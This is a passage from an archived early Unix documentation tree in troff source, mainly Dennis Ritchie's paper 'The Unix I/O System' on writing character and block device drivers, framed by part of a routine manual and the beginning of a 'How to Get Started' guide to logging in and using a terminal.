This routine places in the character array expected as its argument
a string
which is legal to use as a file name
and which is guaranteed to be unique
among all jobs executing on the computer at the same
time.  It is thus appropriate for use as a temporary
file name, although
the user may wish to move it into an appropriate directory.
The value of the function is the address
of the string.
.sn
ABORT (code)
.sN
Causes your program to terminate abnormally, which typically
results in a dump by the operating system.
.sn
INTSS ()
.sN
This routine tells you whether you are running in
foreground or background.
The definition of ``foreground'' is that
the standard input is the terminal.
.sn
WDLENG (\|)
.sN
This returns 16 on \*sUNIX\*S.
C users should be aware that the preprocessor
normally provides a defined symbol suitable for distinguishing the local system;
thus on
.SM
UNIX
.NL
the symbol
.I
unix
.R
is defined
before starting to compile your program.
-- /usr/doc/iosys mode=0140775 uid=3 gid=3 atime=173059656 mtime=173059507 --
-- /usr/doc/iosys/iosys mode=0110664 uid=3 gid=3 atime=170468686 mtime=173059656 --
.lg
.tr _\(ul
.pl 11i
.ll 6.5i
.ps 10
.vs 11p
.br
.tl '-'''
.de pg
.sp .5
..
.de it
.ft I
\\$1
.ft R
..
.de bd
.ft B
\\$1
.ft R
..
.de he
.tl '-'''
'sp .5i
.ft I
.if e  'tl '% - Unix I/O System'''
.if o 'tl '''Unix I/O System - %'
.ft P
'sp .5i
'ns
..
.de fo
'bp
..
.de MS
.ne 4
.sp
.ft B
\\$1
.pg
.ft R
..
.de ms
.ne 4
.sp
.ft I
\\$1
.pg
.ft R
..
.sp 1.5i
.wh 0 he
.wh -1i fo
.ps 16
.ce
The Unix I/O System
.sp .25i
.ps 10
.ft I
.ce 2
Dennis M. Ritchie
Bell Telephone Laboratories
.ft R
.ps 10
.sp .7i
This paper gives an overview of the workings of the Unix
I/O system.
It was written with an eye toward providing
guidance to writers of device driver routines,
and is oriented more toward describing the environment
and nature of device drivers than the implementation
of that part of the file system which deals with
ordinary files.
.pg
It is assumed that the reader has a good knowledge
of the overall structure of the file system as discussed
in the paper ``The Unix Time-sharing System.''
Moreover the present document is intended to be used in
conjunction with a copy of the system code,
since it is basically an exegesis of that code.
.MS "Device Classes"
There are two classes of device:
.it block
and
.it character.
The block interface is suitable for devices
like disks, tapes, and DECtape
which work, or can work, with addressible 512-byte blocks.
Ordinary magnetic tape just barely fits in this category,
since by use of forward
backward spacing any block can be read, even though
blocks can be written only at the end of the tape.
Block devices can at least potentially contain a mounted
file system.
The interface to block devices is very highly structured;
the drivers for these devices share a great many routines
as well as a pool of buffers.
.pg
Character-type devices have a much
more straightforward interface, although
more work must be done by the driver itself.
.pg
Devices of both types are named by a
.it major
and a
.it minor
device number.
These numbers are generally stored as a word
with the minor device number
as the low byte and the major device number
as the high byte.
The major device number selects which driver will deal with
the device; the minor device number is not used
by the rest of the system but is passed to the
driver at appropriate times.
Typically the minor number
selects a subdevice attached to
a given controller, or one of
several similar hardware interfaces.
.pg
The major device numbers for block and character devices
are used as indices in separate tables;
they both start at 0 and therefore overlap.
.MS "Overview of I/O"
The purpose of
the
.it open
and
.it creat
system calls is to set up entries in three separate
system tables.
The first of these is the
.it u_ofile
table,
which is stored in the system's per-process
data area
.it u.
This table is indexed by
the file descriptor returned by the
.it open
or
.it creat,
and is accessed during
a
.it read,
.it write,
or other operation on the open file.
An entry contains only
a pointer to the corresponding
entry of the
.it file
table,
which is a per-system data base.
There is one entry in the
.it file
table for each
instance of
.it open
or
.it creat.
This table is per-system because the same instance
of an open file must be shared among the several processes
which can result from
.it forks
after the file is opened.
A
.it file
table entry contains
flags which indicate whether the file
was open for reading or writing or is a pipe, and
a count which is used to decide when all processes
using the entry have terminated or closed the file
(so the entry can be abandoned).
There is also a 32-bit file offset
which is used to indicate where in the file the next read
or write will take place.
Finally, there is a pointer to the
entry for the file in the
.it inode
table,
which contains a copy of the file's i-node.
Notice that an entry in the
.it file
table corresponds precisely to an instance of
.it open
or
.it creat;
if the same file is opened several times,
it will have several
entries in this table.
However,
there is at most one entry
in the
.it inode
table for a given file.
Also, a file may enter the
.it inode
table not only because it is open,
but also because it is the current directory
of some process or because it
is a special file containing a currently-mounted
file system.
.pg
An entry in the
.it inode
table differs somewhat from the
corresponding i-node as stored on the disk;
the modified and accessed times are not stored,
and the entry is augmented
by a flag word containing information about the entry,
a count used to determine when it may be
allowed to disappear,
and the device and i-number
whence the entry came.
.pg
During the processing of an
.it open
or
.it creat
call for a special file,
the system always calls the device's
.it open
routine to allow for any special processing
required (rewinding a tape, turning on
the data-terminal-ready lead of a modem, etc.).
However,
the
.it close
routine is called only when the last
process closes a file,
that is, when the i-node table entry
is being deallocated.
Thus it is not feasible
for a device to maintain, or depend on,
a count of its users, although it is quite
possible to
implement an exclusive-use device which cannot
be reopened until it has been closed.
.pg
When a
.it read
or
.it write
takes place,
the user's arguments
and the
.it file
table entry are used to set up the
variables
.it u.u_base,
.it u.u_count,
and
.it u.u_offset
which respectively contain the (user) address
of the I/O target area, the byte-count for the transfer,
and the current location in the file.
If the file referred to is
a character-type special file, the appropriate read
or write routine is called; it is responsible
for transferring data and updating the
count and current location appropriately
as discussed below.
Otherwise, the current location is used to calculate
a logical block number in the file.
If the file is an ordinary file the logical block
number must be mapped (possibly using an indirect block)
to a physical block number; a block-type
special file need not be mapped.
In any event, the resulting physical block number
is used, as discussed below, to
read or write the appropriate device.
.MS "Character device drivers"
The
.it cdevsw
table specifies the interface routines present for
character devices.
Each device provides five routines:
open, close, read, write, and special-function.
Any of these may be missing.
If a call on the routine
should be ignored,
(e.g.
.it open
on non-exclusive devices which require no setup)
the
.it cdevsw
entry can be given as
.it nulldev;
if it should be considered an error,
(e.g.
.it write
on read-only devices)
.it nodev
is used.
.pg
The
.it open
routine is called each time the file
is opened with the full device number as argument.
The second argument is a flag which is
non-zero only if the device is to be written upon.
.pg
The
.it close
routine is called only when the file
is closed for the last time,
that is when the very last process in
which the file is open closes it.
This means it is not possible for the driver to
maintain its own count of its users.
The first argument is the device number;
the second is a flag which is non-zero
if the file was open for writing in the process which
performs the final
.it close.
.pg
When
.it write
is called, it is supplied the device
as argument.
The per-user variable
.it u.u_count
has been set to
the number of characters indicated by the user;
for character devices, this number may be 0
initially.
.it u.u_base
is the address supplied by the user from which to start
taking characters.
The system may call the
routine internally, so the
flag
.it u.u_segflg
is supplied which indicates,
if
.it on,
that
.it u.u_base
refers to the system address space instead of
the user's.
.pg
The
.it write
routine
should copy up to
.it u.u_count
characters from the user's buffer to the device,
decrementing
.it u.u_count
for each character passed.
For most drivers, which work one character at a time,
the routine
.pg
.ti 5
.it "cpass( )"
.pg
is used to pick up characters
from the user's buffer.
Successive calls on it return
the characters to be written until
.it u.u_count
goes to 0 or an error occurs,
when it returns \(mi1.
.it Cpass
takes care of interrogating
.it u.u_segflg
and updating
.it u.u_count.
.pg
Write routines which want to transfer
a probably large number of characters into an internal
buffer may also use the routine
.pg
.ti 5
.it "iomove(buffer, offset, count, flag)"
.pg
which is faster when many characters must be moved.
.it Iomove
transfers up to
.it count
characters into the
.it buffer
starting
.it offset
bytes from the start of the buffer;
.it flag
should be
.it B_WRITE
(which is 0) in the write case.
Caution:
the caller is responsible for making sure
the count is not too large and is non-zero.
As an efficiency note,
.it iomove
is much slower if any of
.it "buffer+offset, count"
or
.it u.u_base
is odd.
.pg
The device's
.it read
routine is called under conditions similar to
.it write,
except that
.it u.u_count
is guaranteed to be non-zero.
To return characters to the user, the routine
.pg
.ti 5
.it "passc(c)"
.pg
is available; it takes care of housekeeping
like
.it cpass
and returns \(mi1 as the last character
specified by
.it u.u_count
is returned to the user;
before that time, 0 is returned.
.it Iomove
is also usable as with
.it write;
the flag should be
.it B_READ
but the same cautions apply.
.pg
The ``special-functions'' routine
is invoked by the
.it stty
and
.it gtty
system calls as follows:
.pg
.ti 5
.it "(*p) (dev, v)"
.pg
where
.it p
is a pointer to the device's routine,
.it dev
is the device number,
and
.it v
is a vector.
In the
.it gtty
case,
the device is supposed to place up to 3 words of status information
into the vector; this will be returned to the caller.
In the
.it stty
case,
.it v
is 0;
the device should take up to 3 words of
control information from
the array
.it "u.u_arg[0...2]."
.pg
Finally, each device should have appropriate interrupt-time
routines.
When an interrupt occurs, it is turned into a C-compatible call
on the devices's interrupt routine.
The interrupt-catching mechanism makes
the low-order four bits of the ``new PS'' word in the
trap vector for the interrupt available
to the interrupt handler.
This is conventionally used by drivers
which deal with multiple similar devices
to encode the minor device number.
After the interrupt has been processed,
a return from the interrupt handler will
return from the interrupt itself.
.pg
A number of subroutines are available which are useful
to character device drivers.
Most of these handlers, for example, need a place
to buffer characters in the internal interface
between their ``top half'' (read/write)
and ``bottom half'' (interrupt) routines.
For relatively low data-rate devices, the best mechanism
is the character queue maintained by the
routines
.it getc
and
.it putc.
A queue header has the structure
.pg
.in 5
.ft I
.nf
struct {
	int	c_cc;	/* character count */
	char	*c_cf;	/* first character */
	char	*c_cl;	/* last character */
} queue;
.pg
.ft R
.in 0
.fi
A character is placed on the end of a queue by
.pg
.ti 5
.it "putc(c, &queue)"
.pg
where
.it c
is the character and
.it queue
is the queue header.
The routine returns \(mi1 if there is no space
to put the character, 0 otherwise.
The first character on the queue may be retrieved
by
.pg
.ti 5
.it "getc(&queue)"
.pg
which returns either the (non-negative) character
or \(mi1 if the queue is empty.
.pg
Notice that the space for characters in queues is
shared among all devices in the system
and in the standard system there are only some 600
character slots available.
Thus device handlers,
especially write routines, must take
care to avoid gobbling up excessive numbers of characters.
.pg
The other major help available
to device handlers is the sleep-wakeup mechanism.
The call
.pg
.ti 5
.it "sleep(event, priority)"
.pg
causes the process to wait (allowing other processes to run)
until the
.it event
occurs;
at that time, the process is marked ready-to-run
and the call will return when there is no
process with higher
.it priority.
.pg
The call
.pg
.ti 5
.it "wakeup(event)"
.pg
indicates that the
.it event
has happened, that is, causes processes sleeping
on the event to be awakened.
The
.it event
is an arbitrary quantity agreed upon
by the sleeper and the waker-up.
By convention, it is the address of some data area used
by the driver, which guarantees that events
are unique.
.pg
Processes sleeping on an event should not assume
that the event has really happened;
they should check that the conditions which
caused them to sleep no longer hold.
.pg
Priorities can range from 127 to \(mi127;
a higher numerical value indicates a less-favored
scheduling situation.
A process sleeping at negative priority cannot
be terminated for any reason, although it
is conceivable that it may be swapped out.
Thus it is a bad idea to sleep with negative
priority on an event which might never occur.
On the other hand, calls to
.it sleep
with non-negative priority
may never return if the process is terminated by
some signal in the meantime.
Incidentally, it is a gross error to call
.it sleep
in a routine called at interrupt time, since the process
which is running is almost certainly not the
process which should go to sleep.
Likewise, none of the variables in the user area
``\fIu\fB.\fR''
should be touched, let alone changed, by an interrupt routine.
.pg
If a device driver
wishes to wait for some event for which it is inconvenient
or impossible to supply a
.it wakeup,
(for example, a device going on-line, which does not
generally cause an interrupt),
the call
.pg
.ti 5
.it "sleep(&lbolt, priority)
.pg
may be given.
.it Lbolt
is an external cell whose address is awakened once every 4 seconds
by the clock interrupt routine.
.pg
The routines
.pg
.ti 5
.it "spl4( ), spl5( ), spl6( ), spl7( )"
.pg
are available to
set the processor priority level as indicated to avoid
inconvenient interrupts from the device.
.pg
If a device needs to know about real-time intervals,
then
.pg
.ti 5
.it "timeout(func, arg, interval)
.pg
will be useful.
This routine arranges that after
.it interval
sixtieths of a second, the
.it func
will be called with
.it arg
as argument, in the style
.pg
.ti 5
.it "(*func)(arg)
.pg
Timeouts are used, for example,
to provide real-time delays after function characters
like new-line and tab in typewriter output,
and to terminate an attempt to
read the 201 Dataphone
.it dp
if there is no response within a specified number
of seconds.
Notice that the number of sixtieths of a second is limited to 32767,
since it must appear to be positive,
and that only a bounded number of timeouts
can be going on at once.
Also, the specified
.it func
is called at clock-interrupt time, so it should
conform to the requirements of interrupt routines
in general.
.ms "An example"
The driver for the paper-tape
reader/punch is worth examining
as a fairly simple example of
many of the techniques used in writing
character device handlers.
The
.it pc11
structure contains a state (used for the reader),
an input queue, and an output queue.
A structure, rather than three
individual variables,
was used to cut down on the number of
external symbols which might be confused
with symbols in other routines.
.pg
When the file is opened for reading,
the
.it open
routine checks to see if its state is not
.it CLOSED;
if so an error is returned since it is considered
a bad idea to let several people read one tape
simultaneously.
The state is set to
.it WAITING,
the interrupt is enabled, and a character is requested.
The reason for this gambit is that there is no direct way to
determine if there is any tape in the reader
or if the reader is on-line.
In these situations an interrupt will occur
immediately and an error indicated.
As will be seen, the interrupt routine
ignores errors if the state is
.it WAITING,
but if a good character comes in while
in the
.it WAITING
state the interrupt routine sets the state to
.it READING.
Thus
.it open
loops until the state changes, meanwhile
sleeping on the
``lightning bolt''
.it lbolt.
If it did not sleep at all, it would prevent
any other process from running until the reader came on-line;
if it depended on the interrupt routine to wake it up,
the effect would be the same, since the error
interrupt is almost instantaneous.
.pg
The open-write case is much simpler; the
punch is enabled and a 100-character leader is punched
using
.it pcleader.
.pg
The
.it close
routine is also simple; if the reader was open,
any uncollected characters are flushed,
the interrupt is turned off, and
the state is set to
.it CLOSED.
In the write case a 100-character trailer
is punched.
The routine has a bug in that
if both the reader and punch are open
.it close
will be called only once, so that either the
leftover characters are flushed
or the trailer is punched,
but not both.
It is hard to see how to fix this problem
except by making the reader and punch separate devices.
.pg
The
.it pcread
routine
tries to pick up characters from the input queue
and passes them back until the user's read call
is satisfied.
If there
are no characters it checks
whether the state has gone to
.it EOF,
which means that the interrupt routine
detected an error in the
.it READ
state (assumed to indicate the end of the tape).
If so,
.it pcread
returns;
either during this call or the next one no characters will
be passed back, indicating an end-of-file.
If the state is still
.it READING
the routine enables another character by fiddling the
device's reader control register,
provided it is not active,
and goes to sleep.
.pg
When a reader interrupt occurs
and the state is
.it WAITING,
and the device's error bit is set,
the interrupt is ignored;
if there is no error the state is set to
.it READING,
as indicated in the discussion
of
.it pcread.
If the state is
.it READING
and there is an error, the state is set to
.it EOF;
it is assumed that the error represents
the end of the tape.
If there is no error, the character is picked up and
stored in the input queue.
Then, provided the number of characters
already in the queue is less than the
high-water mark
.it PCIHWAT,
the reader is enabled again to 
read another character.
This strategy keeps the tape moving
without flooding the input queue with unread characters.
Finally, the top half is awakened.
.pg
Looking again at
.it pcread,
notice that
the priority  level is raised
by
.it "spl4( )"
to prevent interrupts during the loop.
This is done because of the
possibility that the input queue is empty,
and just after the EOF test is made
an error interrupt occurs because the
tape runs out.
Then
.it sleep
will be called with no possibility of
a
.it wakeup.
In general the processor priority
should be raised
when a routine is about
to sleep awaiting some condition where the
presence of the condition, and the consequent
.it wakeup,
is indicated by an interrupt.
The danger is that
the interrupt might occur between
the test for the condition and the call to
.it sleep,
so that the
.it wakeup
apparently never happens.
.pg
At the same time it is a bad idea to
raise the processor priority level
for an extended period of time,
since devices with real-time
requirements may be shut out so long as to cause an
error.
The
.it pcread
routine is perhaps overzealous
in this respect, although since most
devices have a priority level higher than 4
this difficulty is not very important.
.pg
The
.it pcwrite
routine simply gets characters from the user
and passes them to
.it pcoutput,
which is separated out so that
.it pcleader
can call it also.
.it Pcoutput
checks for errors (like out-of-tape)
and if none are present
makes sure that
the number of characters in the output queue
does not exceed
.it PCOHWAT;
if it does,
.it sleep
is called.
Then the character is placed on the output queue.
There is a small bug here in that
.it pcoutput
does not check that
the character was successfully put on the queue
(all character-queue space might be empty);
perhaps in this case it might be a good idea to
sleep on the lightning-bolt
until things quiet down.
Finally
.it pcstart
is called,
which checks to see if the punch is currently busy,
and if not starts the punching of the
first character on the output queue.
.pg
When punch interrupts occur,
.it pcpint
is called;
it starts the punching of the next character on the output
queue,
and if the number of characters remaining on the queue is
less than the low-water mark
.it PCOLWAT
it
wakes up the write routine,
which is presumably waiting for the queue to
empty.
.MS "The Block-device Interface"
Handling of block devices is mediated by a collection
of routines which manage a set of buffers containing
the images of blocks of data on the various devices.
The most important purpose of these routines is to assure
that several processes which access the same block of the same
device in multiprogrammed fashion maintain a consistent
view of the data in the block.
A secondary but still important purpose is to increase
the efficiency of the system by
keeping in-core copies of blocks which are being
accessed frequently.
The main data base for this mechanism is the
table of buffers
.it buf.
Each buffer header contains a pair of pointers
.it "(b_forw, b_back)"
which maintain a doubly-linked list
of the buffers associated with a particular
block device, and a
pair of pointers
.it "(av_forw, av_back)"
which generally maintain a doubly-linked list of blocks
which are ``free,'' that is,
eligible to be reallocated for another transaction.
Buffers which have I/O in progress
or are busy for other purposes do not appear in this list.
The buffer header
also contains the device and block number to which the
buffer refers, and a pointer to the actual storage associated with
the buffer.
There is a word count
which is the negative of the number of words
to be transferred to or from the buffer;
there is also an error byte and a residual word
count used to communicate information
from an I/O routine to its caller.
Finally, there is a flag word
with bits indicating the status of the buffer.
These flags will be discussed below.
.pg
Six routines constitute
the most important part of the interface with the
rest of the system.
Given a device and block number,
both
.it bread
and
.it getblk
return a pointer to a buffer header for the block;
the difference is that
.it bread
is guaranteed to return a buffer actually containing the
current data for the block,
while
.it getblk
returns a buffer which contains the data in the
block only if it is already in core (whether it is
or not is indicated by the
.it B_DONE
bit; see below).
In either case the buffer, and the corresponding
device block, is made ``busy,''
so that other processes referring to it
are obliged to wait until it becomes free.
.it Getblk
is used, for example,
when a block is about to be totally rewritten,
so that its previous contents are
not useful;
still, no other process can be allowed to refer to the block
until the new data is placed into it.
.pg
Given a pointer to a buffer,
the
.it brelse
routine
makes the buffer again available to other processes.
It is called, for example, after
data has been extracted following a
.it bread.
There are three subtly-different write routines,
all of which take a buffer pointer as argument,
and all of which logically release the buffer for
use by others and place it on the free list.
.it Bwrite
puts the
buffer on the appropriate device queue,
waits for the write to be done,
and sets the user's error flag if required.
.it
.it Bawrite
places the buffer on the device's queue, but does not wait
for completion, so that errors cannot be reflected directly to
the user.
.it Bdwrite
does not start any I/O operation at all,
but merely marks
the buffer so that if it happens
to be grabbed from the free list to contain
data from some other block, the data in it will
first be written
out.
.pg
.it Bwrite
is used when one wants to be sure that
I/O takes place correctly, and that
errors are reflected to the proper user;
it is used, for example, when updating i-nodes.
.it Bawrite
is useful when more efficiency is desired
(because no wait is required for I/O to finish)
but when it is reasonably certain that the
write is really required.
.it Bdwrite
is used when there is doubt that the write is
needed at the moment.
For example,
.it bdwrite
is called when the last byte of a
.it write
system call falls short of the end of a
block, on the assumption that
another
.it write
will be given soon which will re-use the same block.
On the other hand,
as the end of a block is passed,
.it bawrite
is called, since probably the block will
not be accessed again soon and one might as
well start the writing process as soon as possible.
.pg
In any event, notice that the routines
.it "getblk"
and
.it bread
dedicate the given block exclusively to the
use of the caller, and make others wait,
while one of
.it "brelse, bwrite, bawrite,"
or
.it bdwrite
must eventually be called to free the block for use by others.
.pg
As mentioned, each buffer header contains a flag
word which indicates the status of the buffer.
Since they provide
one important channel for information between the drivers and the
block I/O system, it is important to understand these flags.
The following names are manifest constants which
select the associated flag bits.
.ms B_READ
This bit is set when the buffer is handed to the device strategy routine
(see below) to indicate a read operation.
The symbol
.it B_WRITE
is defined as 0 and does not define a flag; it is provided
as a mnemonic convenience to callers of routines like
.it swap
which have a separate argument
which indicates read or write.
.ms B_DONE
This bit is set
to 0 when a block is handed to the the device strategy
routine and is turned on when the operation completes,
whether normally as the result of an error.
It is also used as part of the return argument of
.it getblk
to indicate if 1 that the returned
buffer actually contains the data in the requested block.
.ms B_ERROR
This bit may be set to 1 when
.it B_DONE
is set to indicate that an I/O or other error occurred.
If it is set the
.it b_error
byte of the buffer header may contain an error code
if it is non-zero.
If
.it b_error
is 0 the nature of the error is not specified.
Actually no driver at present sets
.it b_error;
the latter is provided for a future improvement
whereby a more detailed error-reporting
scheme may be implemented.
.ms B_BUSY
This bit indicates that the buffer header is not on
the free list, i.e. is
dedicated to someone's exclusive use.
The buffer still remains attached to the list of
blocks associated with its device, however.
When
.it getblk
(or
.it bread,
which calls it) searches the buffer list
for a given device and finds the requested
block with this bit on, it sleeps until the bit
clears.
.ms B_WANTED
This flag is used in conjunction with the
.it B_BUSY
bit.
Before sleeping as described
just above,
.it getblk
sets this flag.
Conversely, when the block is freed and the busy bit
goes down (in
.it brelse)
a
.it wakeup
is given for the block header whenever
.it B_WANTED
is on.
This strategem avoids the overhead
of having to call
.it wakeup
every time a buffer is freed on the chance that someone
might want it.
.ms B_ASYNC
This bit is set by
.it bawrite
to indicate to the appropriate device driver
that the buffer should be released when the
write has been finished, usually at interrupt time.
The difference between
.it bwrite
and
.it bawrite
is that the former starts I/O, waits until it is done, and
frees the buffer.
The latter merely sets this bit and starts I/O.
The bit indicates that
.it relse
should be called for the buffer on completion.
.ms B_DELWRI
This bit is set by
.it bdwrite
before releasing the buffer.
When
.it getblk,
while searching for a free block,
discovers the bit is 1 in a buffer it would otherwise grab,
it causes the block to be written out before reusing it.
.ms B_XMEM
This is actually a mask for the pair
of bits which contain the high-order two bits
of the physical address of the origin
of the buffer; these bits are an extension of the 16 address
bits elsewhere in the buffer header.
.ms B_RELOC
This bit is currently unused; it previously indicated
that a system-wide relocation constant was to be added
to the buffer address.
It was needed during a period when addresses
of data in the system (including the buffers)
were mapped by the relocation hardware to
a physical address differing from its
virtual address.
.MS "Block Device Drivers"
The
.it bdevsw
table contains the names of the interface routines
and that of a table for each block device.
.pg
Just as for character devices, block device drivers may supply
an
.it open
and a
.it close
routine
called respectively on each open and on the final close
of the device.
Instead of separate read and write routines,
each block device driver has a
.it strategy
routine which is called with a pointer to a buffer
header as argument.
As discussed, the buffer header contains
a read/write flag, the core address (including extended-memory
bits),
the block number, a (negative) word count,
and the major and minor device number.
The r\o'o^'le of the strategy routine
is to carry out the operation as requested by the
information in the buffer header.
When the transaction is complete the
.it B_DONE
(and possibly the
.it B_ERROR)
bits should be set.
Then if the
.it B_ASYNC
bit is set,
.it brelse
should be called;
otherwise,
.it wakeup.
In cases where the device
is capable, under error-free operation,
of transferring fewer words than requested,
the device's word-count register should be placed
in the residual count slot of
the buffer header;
otherwise, the residual count should be set to 0.
This particular mechanism is really for the benefit
of the magtape driver;
when reading this device
records shorter than requested are quite normal,
and the user should be told the actual length of the record.
[However the mechanism has not been integrated
into normal I/O even on magtape and is used only
in ``raw'' I/O as discussed below.]
.pg
Notice that although the most usual argument
to the strategy routines
is a genuine buffer header allocated as discussed above,
all that is actually required
is that the argument be a pointer to a place containing the
appropriate information.
For example the
.it swap
routine, which manages movement
of core images to and from the swapping device,
uses the strategy routine
for this device.
Care has to be taken that
no extraneous bits get turned on in the
flag word.
.pg
The device's table specified by
.it bdevsw
has a
byte to contain an active flag and an error count,
a pair of links which constitute the
head of the chain of buffers for the device
.it "(b_forw, b_back),"
and a first and last pointer for a device queue.
Of these things, all are used solely by the device driver
itself
except for the buffer-chain pointers.
Typically the flag encodes the state of the
device, and is used at a minimum to
indicate that the device is currently engaged in
transferring information and no new command should be issued.
The error count is useful for counting retries
when errors occur.
The device queue is used to remember stacked requests;
in the simplest case it may be maintained as a first-in
first-out list.
Since buffers which have been handed over to
the strategy routines are never
on the list of free buffers,
the pointers in the buffer which maintain the free list
.it "(av_forw, av_back)"
are also used to contain the pointers
which maintain the device queues.
.pg
A couple of routines
are provided which are useful to block device drivers.
.pg
.ti 5
.it "iodone(bp)  ,"
.pg
arranges that the buffer to which
.it bp
points be released or awakened,
as appropriate,
when the
strategy module has finished with the buffer,
either normally or after an error.
(In the latter case the
.it B_ERROR
bit has presumably been set.)
.pg
When the device conforms to some rather loose
standards adhered to by certain DEC hardware,
the routine
.pg
.ti 5
.it "devstart(bp, devloc, devblk, hbcom)"
.pg
is useful.
Here
.it bp
is the address of the buffer header,
.it devloc
is the address of the slot in the device registers which
accepts a perhaps-encoded device block number,
.it devblk
is the block number,
and
.it hbcom
is a quantity to be stored in the high byte of
the device's command register.
It is understood, when using this routine, that
the device registers are laid out in the order
.pg
.in 5
.nf
command register
word count
core address
block (or track or sector)
.fi
.pg
.in 0
where the address of the last corresponds to
.it devloc.
Moreover, the device should correspond to
the RP, RK, and RF devices
with respect to its layout of extended-memory bits
and structure of read and write commands.
.pg
The routine
.pg
.ti 5
.it "geterror(bp)"
.pg
can be used to examine the error bit in a buffer header
and arrange that any error indication found therein is
reflected to the user.
It may be called only in the non-interrupt
part of a driver when I/O has completed
.it (B_DONE
has been set).
.ms "An example"
The RF disk driver is worth studying
as the simplest example of a block I/O device.
Its
.it strategy
routine checks to see if the requested block
lies beyond the end of the device;
the size of the disk, in this instance, is indicated
by the minor device number.
If the request is plausible,
the buffer is placed at the end of the device queue,
and if the disk is not running,
.it rfstart
is called.
.pg
.it Rfstart
merely returns if there is nothing to do, but
otherwise sets the device-active flag,
loads the address extension register,
and calls
.it devstart
to perform the remaining tasks attendant on
beginning a data transfer.
.pg
When a completion or error interrupt occurs,
.it rfintr
is called.
If an error is indicated, and if the error count has not
exceeded 10,
the same transaction is reattempted;
otherwise the error bit is set.
If there was no error or if
10 failing transfers have been issued
the queue is advanced and
.it rfstart
is called to begin another transaction.
.MS "Raw Block-device I/O"
A scheme has been set up whereby block device drivers may
provide the ability to transfer information
directly between the user's core image and the device
without the use of buffers and in blocks as large as
the caller requests.
The method involves setting up a character-type special file
corresponding to the raw device
and providing
.it read
and
.it write
routines which set up what is usually a private,
non-shared buffer header with the appropriate information
and call the device's strategy routine.
If desired, separate
.it open
and
.it close
routines may be provided but this is usually unnecessary.
A special-function routine might come in handy, especially for
magtape.
.pg
A great deal of work has to be done to generate the
``appropriate information''
to put in the argument buffer for
the strategy module;
the worst part is to map relocated user addresses to physical addresses.
Most of this work is done by
.pg
.ti 5
.it "physio(strat, bp, dev, rw)
.pg
whose arguments are the name of the
strategy routine
.it strat,
the buffer pointer
.it bp,
the device number
.it dev,
and a read-write flag
.it rw
whose value is either
.it B_READ
or
.it B_WRITE.
.it Physio
makes sure that the user's base address and count are
even (because most devices work in words)
and that the core area affected is contiguous
in physical space;
it delays until the buffer is not busy, and makes it
busy while the operation is in progress;
and it sets up user error return information.
.pg
The magtape driver is the only one which as of this
writing provides a raw I/O capability;
given
.it physio,
the work involved is trivial, and amounts to
passing back to the user information on the
length of the record read or written.
(There is some funniness because the magtape,
uniquely among DEC devices, works in bytes,
not words.)
Putting in raw I/O for disks should be equally trivial
except that the disk address
has to be carefully checked to make sure it does not overflow
from one logical device to another on which the caller may not have
write permission.
-- /usr/man mode=0140775 uid=3 gid=3 atime=174846444 mtime=173061455 --
-- /usr/man/man0 mode=0140775 uid=3 gid=3 atime=174846438 mtime=173059709 --
-- /usr/man/man0/basinf mode=0110664 uid=3 gid=3 atime=174846296 mtime=173059716 --
.tr |
.bp
.ce
HOW TO GET STARTED
.sp 1.5
This section provides the basic information
you need to get started on \s8UNIX\s10:
how to log in and log out,
how to communicate through your terminal,
and how to run a program.
See ``U\s8NIX\s10 for Beginners''
by Brian W. Kernighan for a more complete introduction
to the system.
.pg
.ft I
Logging in.||
.ft R
You must call \s8UNIX\s10 from an appropriate terminal.
\s8UNIX\s10 supports \s8ASCII\s10 terminals typified by the \s8TTY\s10 37,
the GE Terminet 300, the Dasi 300, and various
graphical terminals.
You must also have a valid user name,
which may be obtained, together with the telephone number, from the system administrators.
The same telephone number
serves terminals operating at all the standard speeds.
After a data connection is established,
the login procedure depends on what kind of terminal
you are using.
.pg
.in .5i
.ul
300-baud terminals:||
Such terminals include the GE Terminet 300, most display terminals,
Execuport, TI, GSI, and certain
Anderson-Jacobson terminals.
These terminals generally have a speed
switch which should be set at ``300'' (or ``30'' for
30 characters per second)
and a half/full duplex switch which should be set at
full-duplex.
(This switch will often have to be changed
since many other systems require half-duplex).
When a connection is established, the system
types ``login:''; you type your
user name, followed by the ``return'' key.
If you have a password, the system asks for it
and turns off the printer on the terminal
so the password will not appear.
After you have logged in,
the ``return'', ``new line'', or ``linefeed'' keys
will give exactly the same results.
.pg
.ul
\s8TTY\s10 37 terminal:||
When you have established a data connection,
the system types out a few garbage characters
(the ``login:'' message at the wrong speed).
Depress the ``break'' (or ``interrupt'')
key; this is a speed-independent signal
to \s8UNIX\s10 that a 150-baud terminal
is in use.
The system then will type ``login:,'' this time at the correct
speed;
you respond with your user name.
From the \s8TTY\s10 37 terminal, and any other which has the ``new-line''
function (combined carriage return and linefeed), terminate each line you type with the
``new-line'' key
(\fInot\fR the ``return'' key).
.pg
.in 0
For all these terminals, it is important
that you type your name in lower-case if possible; if you type
upper-case letters, \s8UNIX\s10
will assume that your terminal cannot generate lower-case
letters and will translate all subsequent upper-case
letters to lower case.
.pg
The evidence that you have successfully
logged in is that the Shell program
will type a ``%'' to you.
(The Shell is described below under
``How to run a program.'')
.pg
For more information, consult
\fIgetty\fR (VIII), which discusses the login sequence in more
detail, and \fItty\fR (IV), which discusses typewriter I/O.
.pg
.ul
Logging out.||
There are three ways to log out:
.pg
.in .5i
You can simply hang up the phone.
.pg
You can log out by typing an end-of-file indication
(EOT character, control ``d'') to the Shell.
The Shell will terminate and the ``login: '' message
will appear again.
.pg
You can also log in directly as another user
by giving a \fIlogin\fR command (I).
.pg
.in 0
.ul
How to communicate through your terminal.||
When you type to \s8UNIX\s10, a gnome deep in the system
is gathering your characters and saving them in a secret
place.
The
characters will not be given to a program
until you type a return (or new-line), as described above
in
.ul
Logging in.
.pg
\s8UNIX\s10 typewriter I/O is full-duplex.
It has full read-ahead, which means that you can
type at any time,
even while a program is
typing at you.
Of course, if you type during output, the output will
have the input characters interspersed.
However, whatever you type will be saved
up and interpreted in correct sequence.
There is a limit to the amount of read-ahead,
but it is generous and not likely to be exceeded unless
the system is in trouble.
When the read-ahead limit is exceeded, the system
throws away all the saved characters.
.pg
On a typewriter input line, the character ``@''
kills all the characters typed before it, so typing mistakes
can be repaired on a single line.
Also, the character ``#'' erases the last character typed.
Successive uses of ``#'' erase characters back to, but
not beyond, the beginning of the line.
``@'' and ``#'' can be transmitted to a program
by preceding them with ``\\''.
(So, to erase ``\\'', you need two ``#''s).
.pg
The \s8ASCII\s10 ``delete'' (a.k.a. ``rubout'') character is not passed to programs
but instead generates
an
.ul
interrupt signal.
This signal
